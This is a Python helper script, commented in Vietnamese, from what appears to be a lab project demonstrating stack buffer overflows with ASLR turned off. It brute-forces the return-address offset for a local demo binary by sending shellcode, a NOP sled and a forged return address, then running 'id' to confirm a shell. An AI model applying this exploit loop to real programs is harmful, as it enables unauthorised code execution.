#!/usr/bin/env python3
"""
Tìm OFFSET_RET và RET_DELTA khi Phase1 không ra uid= trên máy bạn (GCC/layout khác).

Yêu cầu:
  - ASLR tắt: sudo sysctl -w kernel.randomize_va_space=0
  - Đã build: cd demo_aslr && make

Chạy từ thư mục gốc project:
  python3 tools/find_ret_layout.py
"""

import os
import re
import struct
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "exploits"))
from exploit_config import SHELLCODE, get_binary_path, get_demo_dir, stdbuf_wrap_cmd


def parse_buf(line: bytes):
    m = re.search(rb"0x[0-9a-fA-F]+", line)
    return int(m.group(0), 16) if m else None


def try_once(binary: str, cwd: str, off: int, delta: int) -> bool:
    proc = subprocess.Popen(
        stdbuf_wrap_cmd(binary),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=cwd,
        bufsize=0,
    )
    proc.stdout.readline()
    proc.stdout.readline()
    line_buf = proc.stdout.readline()
    proc.stdout.readline()
    buf = parse_buf(line_buf)
    if buf is None:
        proc.kill()
        return False
    ret = buf + delta
    if off < len(SHELLCODE):
        return False
    payload = SHELLCODE + b"\x90" * (off - len(SHELLCODE)) + struct.pack("<Q", ret)
    try:
        proc.stdin.write(payload + b"\n")
        proc.stdin.write(b"id\n")
        proc.stdin.write(b"exit\n")
    except BrokenPipeError:
        pass
    proc.stdin.close()
    out = proc.stdout.read()
    proc.wait()
    return re.search(rb"uid=\d+", out) is not None


def main() -> int:
    binary = get_binary_path()
    cwd = get_demo_dir()
    if not os.path.isfile(binary):
        print("Không thấy binary. Chạy: cd demo_aslr && make", file=sys.stderr)
        return 1
    for off in range(64, 200, 8):
        for delta in range(0, 129, 8):
            if try_once(binary, cwd, off, delta):
                print(f"FOUND: OFFSET_RET={off}  RET_DELTA={delta}")
                print()
                print("Sửa exploits/exploit_config.py hai dòng:")
                print(f"  OFFSET_RET = {off}")
                print(f"  RET_DELTA = {delta}")
                return 0
    print("Không tìm thấy trong off 64..192, delta 0..128.", file=sys.stderr)
    print("Mở tools/find_ret_layout.py và mở rộng vòng for.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
